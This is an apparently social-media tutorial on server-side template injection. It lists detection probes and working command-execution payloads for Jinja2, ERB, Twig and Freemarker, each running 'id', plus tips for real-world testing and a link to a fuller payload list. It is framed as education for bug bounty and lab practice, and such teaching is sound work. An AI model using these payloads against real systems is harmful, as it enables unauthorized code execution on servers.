# 🔥 Server-Side Template Injection (SSTI) — Explained with Payloads 🔥

Learn how to detect and exploit SSTI vulnerabilities across popular template engines used in modern web applications.

---

## 🔍 What is SSTI?

**Server-Side Template Injection (SSTI)** occurs when unsanitized user input is directly embedded into server-side templates.  
If exploited, this vulnerability may allow **arbitrary code execution** on the server — making it a high-risk issue.

Common template engines vulnerable to SSTI:

- ⚡️ **Jinja2** (Python)
- ⚡️ **Twig** (PHP)
- ⚡️ **Freemarker** (Java)
- ⚡️ **ERB** (Ruby)
- ⚡️ **Handlebars** (Node.js)

---

## 🧪 SSTI Detection Payloads

Inject these simple math operations into form fields, URLs, or headers to test for template evaluation:

| Payload        | Expected Output | Engine        |
|----------------|------------------|----------------|
| `{{7*7}}`      | `49`             | Jinja2, Twig   |
| `${7*7}`       | `49`             | Java-based     |
| `<%= 7*7 %>`   | `49`             | ERB (Ruby)     |

---

## 💣 Exploitation Examples

### 🟥 Jinja2 RCE (Python)
```jinja
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

🟧 Ruby ERB (Ruby)
```
<%= `id` %>
```

🟨 Twig (PHP)
```
{{ ['id']|filter('system') }}
```
🟦 Freemarker (Java)
```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id") }
```
🟩 Handlebars (Node.js)
```
{{#with "s" as |string|}}...{{/with}}
```
➡️ Leads to: require('child_process').exec()

## 📚 Bonus Labs & Resources
🔗 [PortSwigger Basic SSTI Lab](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)

🔗 [PortSwigger Research on SSTI](https://portswigger.net/research/server-side-template-injection)

🔗 [SSTI Cheatsheet GitHub](https://github.com/epinna/weevely3/wiki/Server-Side-Template-Injection)

### 🔐 **Pro Tips**
- 1️⃣ Always URL encode payloads during real-world testing.
- 2️⃣ Know your target: payloads depend on the engine used.
- 3️⃣ Analyze error messages — they often reveal the template engine.

### 🚨 Disclaimer
- 🔐 This material is intended for educational purposes only.
- 🔐 Always get proper authorization before performing any security tests.
- 🔐 Testing without permission is illegal and unethical.

📢 **Follow & Share**
💬 Join our community for daily cybersecurity tips, tricks, and deep-dives:
👉 @cybersecplayground
> 💥Our Payload list for ssti : [https://github.com/cybersecplayground/bugbounty...](https://github.com/cybersecplayground/bugbounty-Tips-and-Tricks/blob/main/Payloads/SSTI_Payloads.txt)

Help your team stay safe — share this knowledge! 🚀

#bugbountytips #infosec #ssti #ethicalhacking #cybersecurity #bugbounty
